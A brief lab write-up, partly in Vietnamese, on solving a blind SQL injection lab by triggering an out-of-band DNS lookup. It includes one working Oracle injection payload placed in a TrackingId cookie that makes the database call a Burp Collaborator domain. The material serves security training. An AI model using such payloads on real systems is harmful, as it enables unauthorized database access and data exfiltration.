# Lab: Blind SQL injection with out-of-band interaction

**PRACTITIONER**

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

## Write-up

Lab này response không phản ánh gì cả vì query chạy async, nên phải dùng OAST qua Burp Collaborator.

Em lấy domain từ Burp Collaborator rồi chèn vào payload trong TrackingId để DB gọi DNS ra ngoài, ví dụ kiểu Oracle:

TrackingId=xyz'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('YOUR-COLLABORATOR-ID.burpcollaborator.net') FROM dual)||'

Gửi request xong quay lại Collaborator, nếu thấy DNS interaction hit về là confirm SQLi và solve lab.

Lab này mấu chốt là không nhìn response web nữa, chỉ nhìn callback ở Collaborator.
